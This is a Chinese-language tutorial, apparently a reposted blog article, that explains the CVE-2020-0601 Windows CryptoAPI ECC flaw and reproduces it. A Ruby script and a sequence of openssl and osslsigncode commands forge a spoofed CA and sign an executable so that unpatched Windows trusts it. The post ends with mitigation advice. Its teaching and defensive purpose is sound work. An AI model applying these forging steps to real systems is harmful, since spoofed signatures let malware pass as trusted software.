<!doctype html><html lang=cn><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=referrer content="no-referrer"><link rel=dns-prefetch href=https://i.geekbank.cf/><title>四十六，微软证书漏洞Windows验证机制及可执行文件签名复现 | 极客快訊</title><meta property="og:title" content="四十六，微软证书漏洞Windows验证机制及可执行文件签名复现 - 极客快訊"><meta property="og:type" content="article"><meta property="og:locale" content="cn"><meta property="og:image" content="https://p1.pstatp.com/large/pgc-image/0d55c336fcb743e1b68e167ab3917e4c"><link rel=alternate hreflang=x-default href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/652b4f6.html><link rel=alternate hreflang=zh-tw href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/652b4f6.html><link rel=alternate hreflang=zh-cn href=https://geekbank.cf/cn/%e7%a7%91%e6%8a%80/652b4f6.html><link rel=alternate hreflang=zh-hk href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/652b4f6.html><link rel=alternate hreflang=zh-mo href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/652b4f6.html><link rel=alternate hreflang=zh-my href=https://geekbank.cf/cn/%e7%a7%91%e6%8a%80/652b4f6.html><link rel=alternate hreflang=zh-sg href=https://geekbank.cf/cn/%e7%a7%91%e6%8a%80/652b4f6.html><link rel=canonical href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/652b4f6.html><meta property="article:published_time" content="2020-10-29T21:04:28+08:00"><meta property="article:modified_time" content="2020-10-29T21:04:28+08:00"><meta name=Keywords content><meta name=description content="四十六，微软证书漏洞Windows验证机制及可执行文件签名复现"><meta name=author content="极客快訊"><meta property="og:url" content="/cn/%E7%A7%91%E6%8A%80/652b4f6.html"><link rel=apple-touch-icon sizes=180x180 href=../../apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=../../favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=../../favicon-16x16.png><link rel=manifest href=../../site.webmanifest><link rel=mask-icon href=../../safari-pinned-tab.svg color=#5bbad5><meta name=msapplication-TileColor content="#ffc40d"><meta name=theme-color content="#ffffff"><link rel=stylesheet href=https://geekbank.cf/css/normalize.css><link rel=stylesheet href=https://geekbank.cf/css/style.css><script type=text/javascript src=https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js></script><script type=text/javascript src=https://geekbank.cf/js/jqthumb.min.js></script><script data-ad-client=ca-pub-3525055026201463 async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script></head><body><header id=header class=clearfix><div class=container><div class=col-group><div class=site-name><h1><a id=logo href>🤓 极客快讯 Geek Bank</a></h1><p class=description>为你带来最全的科技知识 🧡</p></div><div><nav id=nav-menu class=clearfix><a class=current href>猜你喜歡</a>
<a href=../../tw/categories/%E7%A7%91%E6%8A%80.html title=科技>科技</a>
<a href=../../tw/categories/%E9%81%8A%E6%88%B2.html title=遊戲>遊戲</a>
<a href=../../tw/categories/%E7%A7%91%E5%AD%B8.html title=科學>科學</a></nav></div></div></div></header><div id=body><div class=container><div class=col-group><div class=col-8 id=main><div class=res-cons><article class=post><header><h1 class=post-title>四十六，微软证书漏洞Windows验证机制及可执行文件签名复现</h1></header><date class="post-meta meta-date">2020-10-29</date><div class=post-meta><span>|</span>
<span class=meta-category><a href=cn/categories/%E7%A7%91%E6%8A%80.html>科技</a></span></div><div class=post-content><p>一.漏洞背景</p><p>1月15日，微软发布了针对CVE-2020-0601的安全补丁，该漏洞是微软在实现椭圆曲线加密(ECC)算法数字证书验证时产生，位于CryptoAPI.dll文件，可被利用于伪造来自可信任来源的签名或证书，并且因其业务特性会衍生出多种攻击向量，具有极高的可利用价值和极大的潜在破坏力，Win10和windows server 2016 & 2019也都在其影响范围内。</p><p><br></p><div class=pgc-img><img alt=四十六，微软证书漏洞Windows验证机制及可执行文件签名复现 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/0d55c336fcb743e1b68e167ab3917e4c><p class=pgc-img-caption></p></div><p>有意思的是，在微软发布公告后，NSA也发布了关于CVE-2020-0601漏洞的预警通告。根据通告可以得知，这个漏洞是由NSA率先独立发现并汇报给微软的（微软在报告中对NSA致谢），也被认为是第一个NSA公开披露的软件系统漏洞，当然也有可能存在其特殊的战术目的。</p><p><br></p><div class=pgc-img><img alt=四十六，微软证书漏洞Windows验证机制及可执行文件签名复现 onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/08a9f6589d6e44f68a5c419f0f90c04b><p class=pgc-img-caption></p></div><p>该漏洞位于Windows CryptoAPI(Crypt32.dll)验证椭圆曲线加密算法证书的方式，可能影响信任的一些实例包括：</p><p>HTTPS连接</p><p>文件签名</p><p>电子邮件签名</p><p>以用户模式启动的签名可执行程序</p><p>此外，该漏洞可以让攻击者伪造代码签名证书对恶意可执行文件进行签名，使文件看似来自可信的来源。例如，可以让勒索软件或其他间谍软件拥有看似有效的证书，从而促使用户安装。中间人攻击并解密用户连接到受影响软件的机密信息也是主要的攻击场景之一。</p><p>目前，支持使用带有指定参数的ECC密钥的证书的Microsoft Windows版本会受到影响，包括了Windows 10、Windows Server 2016/2019以及依赖于Windows CryptoAPI的应用程序。而Windows 10 之前的版本，如Windows 7、Windows Server 2008 R2 等均不受该漏洞的影响。因为win7没有默认添加微软的ECC根证书，crypt32.dll里面也没这个hash值，没法直接对比通过，故不受影响。</p><h1 class=pgc-h-arrow-right>二.漏洞原理</h1><p>该部分主要参考下面两篇文章，再次感谢，也强烈推荐大家阅读这两位老师的博客。花这么多篇幅介绍原理知识，一方面是完善自己的安全知识体系，另一方面只有深入了解原理才能更好地做防御。<br></p><p>1.ECC加密算法</p><p>CVE-2020-0601的根源是微软的加密库crypt32.dll中椭圆曲线加密算法的实现问题，首先我们来了解一下椭圆加密算法的基本原理。</p><p>基础知识</p><p>ECC私钥+椭圆曲线=ECC公钥</p><p>漏洞成因</p><p>微软的私钥+微软选的椭圆曲线=微软根证书里面的公钥</p><p>黑客的私钥+黑客选的椭圆曲线=微软根证书里面的公钥</p><p>不同的椭圆曲线和不同的私钥，能产生一模一样的公钥。win10默认添加了微软的ECC根证书，在做证书验证时，会一直验证到微软根证书中的公钥hash值，这个值直接写在了crypt32.dll里面，验证时没有对比是不是同一个椭圆曲线，只对比了公钥值，导致了黑客拿自己的私钥签名，就能伪装成微软的签名。</p><p>ECC算法</p><p>要形象地理解椭圆曲线加密算法，可以结合图形来看，以下是一个符合椭圆曲线的方程及图像。</p><p><br></p><div class=pgc-img><img alt=四十六，微软证书漏洞Windows验证机制及可执行文件签名复现 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/fec7848b71524aaba46d0ef0447dfc88><p class=pgc-img-caption></p></div><p>椭圆曲线具有的一些独特的性质使它适合用于加密算法：</p><p>椭圆曲线关于x轴对称</p><p>任何一条非垂直的线与曲线最多有三个点相交</p><p>曲线是光滑的，即曲线的所有点都没有两个或者两个以上的不同的切线</p><p>在椭圆曲线上任意两点A、B（若A、B重合则作A的切线），作直线交于椭圆曲线另一点C’，过C’做y轴的平行线与椭圆曲线交于C点，定义A+B=C。椭圆曲线的加法符合交换律和结合律。</p><p><br></p><div class=pgc-img><img alt=四十六，微软证书漏洞Windows验证机制及可执行文件签名复现 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/f15d229108d8401ba79857e82a26587b><p class=pgc-img-caption></p></div><p>如果A、B是同一个点，则过A作椭圆曲线的切线，以同样的方法得到对应的结果 C=2A 。</p><p><br></p><div class=pgc-img><img alt=四十六，微软证书漏洞Windows验证机制及可执行文件签名复现 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/68c47453da1a4cf4b60d688614fb0a39><p class=pgc-img-caption></p></div><p>接下来是椭圆曲线加密相关的重点，如果对多个A进行累加，则可依次累加连线得到nA的值 。</p><ul><li>(1) 起点为A，终点D=3A，阶为3 。</li><li>(2) 起点为A，终点G=4A，阶为4。</li></ul><p><br></p><div class=pgc-img><img alt=四十六，微软证书漏洞Windows验证机制及可执行文件签名复现 onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/f3c7c77ecf83433f9761f4adb30bce2b><p class=pgc-img-caption></p></div><p>椭圆曲线加密算法的数学依据 :</p><p>考虑K=kG，其中K、G为椭圆曲线Ep(a,b)上的点，n为G的阶。k为小于n的整数。给定k和G，根据加法法则计算K很容易（逐次求解）；但反过来，给定K和G，求k就非常困难。因为实际使用中的ECC原则上把私钥k取得相当大，n也相当大，且椭圆曲线不再连续而是在实数内离散的值，要把n个解点逐一算出几乎是不可能的。</p><p>点G称为基点</p><p>k(k&lt;n)为私有密钥</p><p>K为公开密钥</p><p><br></p><div class=pgc-img><img alt=四十六，微软证书漏洞Windows验证机制及可执行文件签名复现 onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/22cf7becfec540d2b91f62fc56e11289><p class=pgc-img-caption></p></div><p>ECC和RSA加密算法对比：</p><p>椭圆曲线加密算法（ECC）和RSA同样是一种公开密钥加密技术，对原始数据以公钥加密，以私钥解密，即便攻击者获取密文和公钥也无法（在合理的时间或代价下）解密获取明文。ECC常被应用于数字签名，以私钥加密生成签名，以公钥解密验证签名，如果和原文一样则签名验证成功。公开密钥加密之所以可靠是因为它们利用了公钥密码领域的单向函数原理，正向操作非常简单，而逆向操作非常困难。由G（基点）出发，进行k（私钥）次变换，很容易地得到终点K（公钥）的值。</p><p><br></p><div class=pgc-img><img alt=四十六，微软证书漏洞Windows验证机制及可执行文件签名复现 onerror=errorimg.call(this); src=https://p9.pstatp.com/large/pgc-image/4fd8e0f665bd4986870eef355aa0111d><p class=pgc-img-caption></p></div><p>已知起点G（基点）和终点K（公钥），要逆推得到移动次数k（私钥）则是一个很难的问题。相比传统RSA加密算法，椭圆加密算法具有着天生的优势，椭圆加密算法的逆向过程相比RSA有着更大的时间复杂度。在密钥长度相同的情况下，椭圆加密算法相比RSA具有更好的安全强度。 一般认为，160比特的椭圆曲线密钥即可提供与1024比特的RSA密钥相当的安全强度。</p><p><br></p><div class=pgc-img><img alt=四十六，微软证书漏洞Windows验证机制及可执行文件签名复现 onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/e0710e0bb6e34934814668ae3a7c3f5f><p class=pgc-img-caption></p></div><p>较短的密钥也意味着更少的存储空间、更快的加解密速度和更少的带宽消耗，正因为椭圆加密算法的这些优势，它被用于Windows的签名系统、https的证书、比特币系统和中国的二代身份证系统中。</p><p>虽然椭圆曲线加密算法具有着许多优势，纯算法角度攻破难度极大，微软对此算法的实现的缺漏却给漏洞利用提供了可乘之机。回到椭圆曲线加密最基本的等式 K=kG，首先需要明确的是，虽然对于给定的基点G和公钥K，要求解私钥k很困难，但是如果可以任意指定基点G，要构造一对k和G使等式成立却极其简单。最简单的情况，令基点G=K，则私钥k=1，这样一对基点和私钥可以使等式成立，也是有效的解。</p><p><br></p><div class=pgc-img><img alt=四十六，微软证书漏洞Windows验证机制及可执行文件签名复现 onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/27af91050cf74a708e5fc6ab0da4b418><p class=pgc-img-caption></p></div><p>在正常的标准椭圆曲线算法中，基点G并不是随意指定的，而是有固定的值（标准文件会对基点G等参数的选择做出规定），例如在secp256r1版本的椭圆曲线算法中，基点G应当为标准规定的固定值，如果对参数不加验证，使得用户可以自定义传入的基点G值（作为函数的参数），上面的私钥k=1的特殊解即可成立。</p><p>在有漏洞版本的crypt32.dll中验证使用ECC算法签名部分的函数恰恰是这个情况，原先的函数未加参数验证，参与计算的基点G的内容由被验证的证书随意指定，使未授权的证书能够构建私钥k=1的特殊解来成功通过椭圆加密算法的签名验证的过程。</p><p>2.Windows证书验证</p><p>以SSL协议为例，讲解Windows如何进行证书验证。比如，小明（m）在某电商（x）网站上购买了一本书，这时就调用了SSL协议进行通讯，建立SSL协议的步骤总结为下图。</p><p><br></p><div class=pgc-img><img alt=四十六，微软证书漏洞Windows验证机制及可执行文件签名复现 onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/c0617271a51b4f22b0e8e99339757574><p class=pgc-img-caption></p></div><p>基本步骤包括：</p><p>① 打招呼： 小明和电商互相介绍自己，小明和电商协商好以后的步骤里将使用到的特定密码算法。在本漏洞中，该算法为ECC加密算法。（该步骤没有利用密码工具）</p><p>② 身份验证： 电商向小明验证自己的身份，电商发送包含自己的公钥的证书。该证书由权威的第三方证书机构（CA）颁发。小明使用CA的公开验证密钥，验证证书中对PK的签名。（漏洞触发地方）</p><p>③ 信息加密： 由小明生成一个随机的密钥MS，该密钥用于生成对双方传输的信息进行对称加密的K1与K2。MS由小明获得的公钥进行加密并交给电商。电商通过手中的私钥解密获得MS。这时双方都获得了用于进行加密通讯的密钥。</p><p>注意：</p><p>在SSL会话过程中，只有电商一方被要求提供证书，小明可能根本没有公钥（或证书）。这和我们平时去小卖部买东西一样，销售方需要提供销售许可, 而你只需要付钱就可以了。</p><p>该漏洞的触发点在于 第三方权威机构（Windows） 在步骤②验证证书时产生的逻辑漏洞，使得攻击者可以通过伪造证书将自身伪装成电商， 与小明 进行通讯。从而达到骗财骗色骗信息的目的。</p><p>通过及时更新微软补丁包可以有效防止上述情况的发生。</p><p>接着我们分享微软验证证书的机制，以及其存在的逻辑漏洞。</p><p>在Windows系统访问一个网站(例Github.com)时, 该网站会向Windows系统发送由第三方权威机构(CA)签署的网站证书。</p><p><br></p><div class=pgc-img><img alt=四十六，微软证书漏洞Windows验证机制及可执行文件签名复现 onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/6a60187ab59746818e1555167d80e9ad><p class=pgc-img-caption></p></div><li>Windows系统则会验证该证书是否由CA颁发，若验证通过，则Windows系统与网站成功建立TLS链接。</li><p><br></p><div class=pgc-img><img alt=四十六，微软证书漏洞Windows验证机制及可执行文件签名复现 onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/6658df949f8b49f186ee4d2d4c0e02c0><p class=pgc-img-caption></p></div><p>为了方便下一次更快的访问，Windows将验证成功的证书放入内存中一块Certificate Cache（证书缓存）中。在下一次校验时，如果该证书存在于缓存中，则直接取缓存中的值进行校验。这里利用CVE-2020-0601。<br></p><div class=pgc-img><img alt=四十六，微软证书漏洞Windows验证机制及可执行文件签名复现 onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/b7f82d74ce1c441abd23e9d6528af123><p class=pgc-img-caption></p></div><p>在成功缓存证书数据后，根据下面描述的Windows证书缓存机制，恶意网站可以伪造虚假的网站（例github.com）证书且通过Windows验证，将自身伪装成合法网站。</p><p><br></p><div class=pgc-img><img alt=四十六，微软证书漏洞Windows验证机制及可执行文件签名复现 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/746348cce5d0475fb415c34c2b3bf036><p class=pgc-img-caption></p></div><p>当 Windows 接收到新的证书时，Windows 将新接收的证书与已缓存证书的证书的公钥进行遍历对比，寻找匹配的值。</p><p><br></p><div class=pgc-img><img alt=四十六，微软证书漏洞Windows验证机制及可执行文件签名复现 onerror=errorimg.call(this); src=https://p9.pstatp.com/large/pgc-image/80e69e0e37f44d6889803afed7b82fa9><p class=pgc-img-caption></p></div><p>伪造的恶意证书与Windows系统中的缓存证书有同样的公钥，但Curve项没有在校验范围内，所以可以通过构造自定义Curve来伪造证书。使得证书验证流程依然成立，但通过验证的证书已经不是之前成功验证的安全证书。</p><p><br></p><div class=pgc-img><img alt=四十六，微软证书漏洞Windows验证机制及可执行文件签名复现 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/d54ebcce404849c885f669c12aa37d3e><p class=pgc-img-caption></p></div><p><strong>写到这里，如果您懵圈了，没关系！我也哭晕了好几次，都发求救贴了，接着我们看看实际操作吧~</strong></p><h1 class=pgc-h-arrow-right>三.可执行文件签名漏洞利用</h1><h2 class=pgc-h-arrow-right>1.证书查看</h2><p>首先，我带领大家看看Windows证书。运行中输入“certmgr.msc”，可以看到这里面有5个系统默认的ECC签名的根证书，如下图所示。</p><p><br></p><div class=pgc-img><img alt=四十六，微软证书漏洞Windows验证机制及可执行文件签名复现 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/e056d832309f4f009c15c5f3e859d3c5><p class=pgc-img-caption></p></div><p>我们随意导出其中一个根证书，导出直接选择Base64编码那个就行。</p><p><br></p><div class=pgc-img><img alt=四十六，微软证书漏洞Windows验证机制及可执行文件签名复现 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/0116119722f84712b965536b815ee97f><p class=pgc-img-caption></p></div><p>可以看到导出的ECC密钥证书如下图所示，包括证书的有效期等信息。这就是微软在实现椭圆曲线加密（ECC）算法的数字证书，位于CryptoAPI.dll文件，也是被我们利用来伪造可信任来源的签名漏洞。</p><p><br></p><div class=pgc-img><img alt=四十六，微软证书漏洞Windows验证机制及可执行文件签名复现 onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/abd39f25f8194a81bfd0b2dbf12743a2><p class=pgc-img-caption></p></div><p>同样，我们可以通过Powershell（其用法推荐前文）查看默认的根证书。</p><pre><code>dir cert:\localmachine\root | Where-Object { $_.FriendlyName -like "*ECC*" }</code></pre><p><br></p><div class=pgc-img><img alt=四十六，微软证书漏洞Windows验证机制及可执行文件签名复现 onerror=errorimg.call(this); src=https://p9.pstatp.com/large/pgc-image/f6e28ca07a43473e9fdf1804feb9ead6><p class=pgc-img-caption></p></div><p>2.环境搭建</p><p>Linux系统、Windows系统WSL软件（Windows Subsystem for Linux）</p><p>Ruby环境、Python环境</p><p>Github资源：main.rb、openssl_cs.conf、签名证书</p><p>可执行exe文件（用于签名</p><p>由于作者是Windows环境，但需要运行Linux命令，所以这里安装了Windows Subsystem for Linux软件。</p><p>第一步，打开应用商城搜索“WSL”，可根据自己需求选择安装一个或多个Linux系统。</p><p><br></p><div class=pgc-img><img alt=四十六，微软证书漏洞Windows验证机制及可执行文件签名复现 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/1a44796246504dc6b5a1706020857ba0><p class=pgc-img-caption></p></div><p><strong>第二步，安装完成后可以在开始菜单的最近添加中打开Ubuntu。第一次打开Ubuntu时，会提示你创建新的用户账户和密码。这个用户账户只是普通的非管理员用户，如果要提升权限，需要使用sudo命令。</strong></p><p><br></p><div class=pgc-img><img alt=四十六，微软证书漏洞Windows验证机制及可执行文件签名复现 onerror=errorimg.call(this); src=https://p9.pstatp.com/large/pgc-image/e0f6447b047649298ac015adc01ca3e1><p class=pgc-img-caption></p></div><p>下面可以测试该环境已经搭建成功，我们能在Windows系统下运行Linux。</p><p><br></p><div class=pgc-img><img alt=四十六，微软证书漏洞Windows验证机制及可执行文件签名复现 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/412614dd4c4845798afec1d7467b3946><p class=pgc-img-caption></p></div><p><strong>第三步，我们复制文件进入。作者使用WSL，主要还因为它的另一个优势，能够访问Windows系统的内容，灵活复制和切换文件。</strong></p><ul><li>(1) 可以在wsl终端输入以下命令 cd /mnt</li><li>(2) 可以在wsl终端输入以下命令 explorer.exe .</li><li>(3) 复制ca.cer文件</li></ul><p><br></p><div class=pgc-img><img alt=四十六，微软证书漏洞Windows验证机制及可执行文件签名复现 onerror=errorimg.call(this); src=https://p9.pstatp.com/large/pgc-image/343b86a27af54d1fb3af817f4981e974><p class=pgc-img-caption></p></div><p>路径为：\wsl$\Ubuntu\home\yxz</p><p><br></p><div class=pgc-img><img alt=四十六，微软证书漏洞Windows验证机制及可执行文件签名复现 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/97031cc3026f42cf95f246e59dae77a8><p class=pgc-img-caption></p></div><p><strong>第四步，使用openssl查看证书信息的内容，后面我们会反复使用该命令。</strong></p><pre><code>openssl x509 -in ca.cer -text -noout</code></pre><p><br></p><div class=pgc-img><img alt=四十六，微软证书漏洞Windows验证机制及可执行文件签名复现 onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/f0b278071d8c4f0a86f6340ff6edd7d1><p class=pgc-img-caption></p></div><blockquote class=pgc-blockquote-abstract><p>在计算机网络上，OpenSSL是一个开放源代码的软件库包，应用程序可以使用这个包来进行安全通信，避免窃听，同时确认另一端连接者的身份。这个包广泛被应用在互联网的网页服务器上。</p></blockquote><p>3.漏洞还原</p><p>接下来将详细讲解如何还原可执行文件签名证书伪装漏洞。</p><p>第一步，安装Ruby环境并测试。</p><p>安装环境：sudo apt install ruby</p><p>查看版本：ruby -v</p><p>创建文件：touch HelloWorld.ry</p><p>编辑代码：vim HelloWorld.ry</p><p>运行代码：ruby HelloWorld.ry</p><p><br></p><div class=pgc-img><img alt=四十六，微软证书漏洞Windows验证机制及可执行文件签名复现 onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/292e26fa0af8404e8b722c7d18a0f3ea><p class=pgc-img-caption></p></div><p><br></p><div class=pgc-img><img alt=四十六，微软证书漏洞Windows验证机制及可执行文件签名复现 onerror=errorimg.call(this); src=https://p9.pstatp.com/large/pgc-image/63399b2d411248549cca347b23ed9446><p class=pgc-img-caption></p></div><p><strong>第二步，提取ECC根证书公钥信息。</strong><br>将main.rb文件和导出的微软ECC签名证书文件复制或上传至Linux系统或WSL。注意，这里的ECC证书也可以使用上面我们导出的那个文件。</p><p>接着运行ruby代码。</p><pre><code>ruby main.rb ./MicrosoftECCProductRootCertificateAuthority.cer</code></pre><p><br></p><div class=pgc-img><img alt=四十六，微软证书漏洞Windows验证机制及可执行文件签名复现 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/9162c3dbf6fc431aa01e852cd972e3ee><p class=pgc-img-caption></p></div><p>此时生成“spoofed_ca.key”公钥文件</p><p><br></p><div class=pgc-img><img alt=四十六，微软证书漏洞Windows验证机制及可执行文件签名复现 onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/a99ee498c26442d19c88e0130ba7012d><p class=pgc-img-caption></p></div><p>main.rb代码如下，设置私钥为1，使得加密等式成立，并生成证书公钥文件。</p><pre><code>require 'openssl'raw = File.read ARGV[0] 	# 读取使用ECC算法的证书文件ca = OpenSSL::X509::Certificate.new(raw) 	# 读取使用ECC算法的证书ca_key = ca.public_key 	    # 从证书中提取公钥ca_keyca_key.private_key = 1    	# 设置私钥为1，使得公钥K==1*基点G的等式成立group = ca_key.group group.set_generator(ca_key.public_key, group.order, group.cofactor)group.asn1_flag = OpenSSL::PKey::EC::EXPLICIT_CURVEca_key.group = group 		# 利用构建的假基点G和假密钥k设置新groupFile.open("spoofed_ca.key", 'w') { |f| f.write ca_key.to_pem } 	# 将新的group写入文件</code></pre><p><strong>第三步，基于此密钥生成一个新的x509证书，这将是我们自己的欺骗性CA。</strong></p><pre><code>openssl req -new -x509 -key spoofed_ca.key -out spoofed_ca.crt</code></pre><p><br></p><div class=pgc-img><img alt=四十六，微软证书漏洞Windows验证机制及可执行文件签名复现 onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/a8f0b53c338348f9b622a703ff6767a5><p class=pgc-img-caption></p></div><p>注意，国家、地区、作者可以随意填写，此时生成“spoofed_ca.crt”公钥文件。</p><p><br></p><div class=pgc-img><img alt=四十六，微软证书漏洞Windows验证机制及可执行文件签名复现 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/a7feb7c8c75744baa5656e0c485f2fdc><p class=pgc-img-caption></p></div><p><strong>第四步，生成一个新密钥。该密钥可以是您想要的任何类型，它将用于创建代码签名证书，我们将使用自己的CA对其进行签名。</strong></p><pre><code>openssl ecparam -name secp384r1 -genkey -noout -out cert.key</code></pre><p><br></p><div class=pgc-img><img alt=四十六，微软证书漏洞Windows验证机制及可执行文件签名复现 onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/e73cc96899f74f13bbe1b38f281ebcf8><p class=pgc-img-caption></p></div><p>此时生成“cert.key”新密钥文件。</p><p><strong>第五步，接下来创建一个新的证书签名请求（CSR）。该请求通常会发送到受信任的CA，但是由于存在欺骗请求，因此我们可以自己对其进行签名。</strong></p><pre><code>openssl req -new -key cert.key -out cert.csr -config openssl_cs.conf -reqexts v3_cs</code></pre><p><br></p><div class=pgc-img><img alt=四十六，微软证书漏洞Windows验证机制及可执行文件签名复现 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/709920756f6940609b6c62fce6409cb6><p class=pgc-img-caption></p></div><p>注意，需要复制openssl_cs.conf文件进去，此时生成“cert.csr”文件。</p><p><br></p><div class=pgc-img><img alt=四十六，微软证书漏洞Windows验证机制及可执行文件签名复现 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/8e85c5a2d602430b94cb54650b9ae729><p class=pgc-img-caption></p></div><p><strong>第六步，使用我们的欺骗性CA和CA密钥签署新的CSR。该证书将在2047年到期，而真正的受信任Microsoft CA将在2043年到期。</strong><br></p><pre><code>openssl x509 -req -in cert.csr -CA spoofed_ca.crt -CAkey spoofed_ca.key -CAcreateserial -out cert.crt -days 10000 -extfile openssl_cs.conf -extensions v3_cs</code></pre><p><br></p><div class=pgc-img><img alt=四十六，微软证书漏洞Windows验证机制及可执行文件签名复现 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/21aa620974ff4ebcb0d06beebda1ee66><p class=pgc-img-caption></p></div><p>生成“cert.crt”签名证书文件。</p><p><br></p><div class=pgc-img><img alt=四十六，微软证书漏洞Windows验证机制及可执行文件签名复现 onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/24666d00f0614db487b872f5b8444a77><p class=pgc-img-caption></p></div><p><strong>第七步，将证书的密钥和欺骗性的CA打包到一个PKCS12文件中，以对可执行文件进行签名。</strong></p><pre><code>openssl pkcs12 -export -in cert.crt -inkey cert.key -certfile spoofed_ca.crt -name "Code Signing" -out cert.p12</code></pre><p><br></p><div class=pgc-img><img alt=四十六，微软证书漏洞Windows验证机制及可执行文件签名复现 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/854c13b10fc44a2598220dda1803f365><p class=pgc-img-caption></p></div><p>生成“cert.p12”名证书文件。</p><p><br></p><div class=pgc-img><img alt=四十六，微软证书漏洞Windows验证机制及可执行文件签名复现 onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/b9654337a5c24aa3bf2e843652d893a4><p class=pgc-img-caption></p></div><p><strong>第八步，用PKCS12文件签名可执行文件。</strong></p><pre><code>osslsigncode sign -pkcs12 cert.p12 -n "Signed by ollypwn" -in python.exe -out python_signed.exe</code></pre><p>注意，osslsigncode可能需要安装，如下所示。</p><p><br></p><div class=pgc-img><img alt=四十六，微软证书漏洞Windows验证机制及可执行文件签名复现 onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/d2d8df561eba4d15931dade6c94c494b><p class=pgc-img-caption></p></div><p>用PKCS12文件签名可执行文件，最终生成“python_signed.exe”签名可执行文件。</p><p><br></p><div class=pgc-img><img alt=四十六，微软证书漏洞Windows验证机制及可执行文件签名复现 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/b6343aa0fa4d4ebc98b40da09cc9fae9><p class=pgc-img-caption></p></div><p><br></p><div class=pgc-img><img alt=四十六，微软证书漏洞Windows验证机制及可执行文件签名复现 onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/7153e330520b45438119c178ddd14f70><p class=pgc-img-caption></p></div><p><strong>第九步，文件右键”属性“打开，如下所示，多了”数字签名“且能看查看”详细信息”。</strong></p><p><br></p><div class=pgc-img><img alt=四十六，微软证书漏洞Windows验证机制及可执行文件签名复现 onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/f56aa767aa68428f88ab64de10f0c87d><p class=pgc-img-caption></p></div><p>点击”查看证书”，可以看到具体信息，比如2047年到期，颁发者为我们设置的“hacker”，以及设置的签名信息，并且证书是可靠地。该可执行文件的数字签名校验通过，并且成功欺骗了系统。</p><p><br></p><div class=pgc-img><img alt=四十六，微软证书漏洞Windows验证机制及可执行文件签名复现 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/69535802bf404fffa7cdfd45142742ae><p class=pgc-img-caption></p></div><p>如果更新补丁知乎，可执行文件的数字签名会无法验证。<br></p><div class=pgc-img><img alt=四十六，微软证书漏洞Windows验证机制及可执行文件签名复现 onerror=errorimg.call(this); src=https://p9.pstatp.com/large/pgc-image/3221901fbda64e53af68930eb38a4151><p class=pgc-img-caption></p></div><p>四.防御措施及总结</p><p>缓解措施</p><p>快速采用补丁是目前已知较好的缓解措施。尽管尚未出现公开的攻击方式和案例，但建议大家及时安装安全更新。更新后，当检测到有人试图利用CVE-2020-0601进行攻击时，系统将在每次重新启动Windows日志后在事件查看器中生成事件ID。</p><p>安全建议</p><p>除了安装修补程序之外，企业还可以采取其他措施保护端点，比如：</p><p>(1) 从网络流量中提取证书，检查可疑的属性；</p><p>(2) 通过执行TLS检查，不使用Windows进行证书验证的代理设备承载流量；</p><p>(3) 在企业内部部署私有根证书颁发机构，并且在特定计算机/服务器位置控制第三方软件的部署和使用；</p><p>(4) 符合条件的企业可以申请加入微软 Security Update Validation Program (SUVP) 或 Microsoft Active Protections Program (MAPP)，从而提前从微软获得安全更新以进行相关的测试分析。</p><p>下一篇作者将尝试利用该漏洞复现HTTPS劫持案例，真的花费了很多精力，希望您喜欢。</p><p><br></p><div class=pgc-img><img alt=四十六，微软证书漏洞Windows验证机制及可执行文件签名复现 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/f788dd405f3045218bdf4923e057cd89><p 